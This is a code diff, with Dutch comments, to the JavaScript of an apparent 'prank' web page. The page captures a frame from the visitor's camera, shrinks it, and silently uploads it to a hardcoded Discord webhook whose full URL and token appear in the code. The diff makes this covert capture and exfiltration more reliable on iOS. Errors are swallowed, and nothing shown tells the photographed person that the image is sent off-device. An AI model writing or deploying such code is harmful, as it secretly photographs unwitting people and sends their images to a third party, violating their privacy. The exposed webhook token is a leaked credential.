@@ -163,53 +163,57 @@
     } catch(e) {}
   }
 
-  /* ---- Foto sturen naar Discord ---- */
+  /* ---- Foto sturen naar Discord (via Blob — betrouwbaarder op iOS) ---- */
   var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1504871411666128917/AJAcDNUnPoNTHhzgNvV2SZc4GmnUuu1wu33vRK8VCPGfycX9iK21A5e7Xaj4P0y7qCtf';
 
-  function stuurNaarDiscord(dataUrl) {
-    if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.indexOf('discord') === -1) return;
-    try {
-      var parts  = dataUrl.split(',');
-      var binary = atob(parts[1]);
-      var arr    = new Uint8Array(binary.length);
-      for (var i = 0; i < binary.length; i++) arr[i] = binary.charCodeAt(i);
-      var blob = new Blob([arr], { type: 'image/jpeg' });
-
-      var fd = new FormData();
-      fd.append('file', blob, 'prank_foto.jpg');
-      fd.append('content', '😂 **Nieuwe prank foto!**\n🕐 ' + new Date().toLocaleString('nl-NL'));
-
-      fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(function(){});
-    } catch(e) {}
+  function stuurNaarDiscord(blob) {
+    if (!DISCORD_WEBHOOK) return;
+    var fd = new FormData();
+    fd.append('file', blob, 'prank_foto.jpg');
+    fd.append('content', 'Nieuwe prank foto! ' + new Date().toLocaleString('nl-NL'));
+    fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd })
+      .catch(function(){});
   }
 
-  /* ---- Foto maken (robuust voor iOS) ---- */
+  /* ---- Foto maken (canvas.toBlob = native iOS, snel en klein) ---- */
   function doCapture() {
     if (capturedPhoto) return;
     if (!activeStream) return;
     var w = camEl.videoWidth;
     var h = camEl.videoHeight;
     if (!w || w === 0) {
-      // Nog niet klaar, probeer opnieuw
       setTimeout(doCapture, 400);
       return;
     }
     try {
       var canvas = document.createElement('canvas');
-      canvas.width = w; canvas.height = h;
-      canvas.getContext('2d').drawImage(camEl, 0, 0, w, h);
-      var data = canvas.toDataURL('image/jpeg', 0.85);
-      if (data && data.length > 100) {
-        capturedPhoto = data;
-        savePhoto(data);
-        stuurNaarDiscord(data);
+      // Max 640px breed — kleinere foto, sneller versturen
+      var scale = Math.min(1, 640 / w);
+      canvas.width  = Math.round(w * scale);
+      canvas.height = Math.round(h * scale);
+      canvas.getContext('2d').drawImage(camEl, 0, 0, canvas.width, canvas.height);
+
+      // Stop stream zodra frame vastgelegd is
+      if (activeStream) {
+        activeStream.getTracks().forEach(function(t) { t.stop(); });
+        activeStream = null;
       }
+
+      // toBlob is native op iOS — veel betrouwbaarder dan toDataURL + atob
+      canvas.toBlob(function(blob) {
+        if (!blob) return;
+        // Lokaal opslaan voor het reveal-scherm
+        var reader = new FileReader();
+        reader.onload = function(e) {
+          capturedPhoto = e.target.result;
+          savePhoto(capturedPhoto);
+        };
+        reader.readAsDataURL(blob);
+        // Naar Discord sturen
+        stuurNaarDiscord(blob);
+      }, 'image/jpeg', 0.75);
+
     } catch(e) {}
-    // Stream stoppen na foto
-    if (activeStream) {
-      activeStream.getTracks().forEach(function(t) { t.stop(); });
-      activeStream = null;
-    }
   }
 
   function scheduleCapture() {
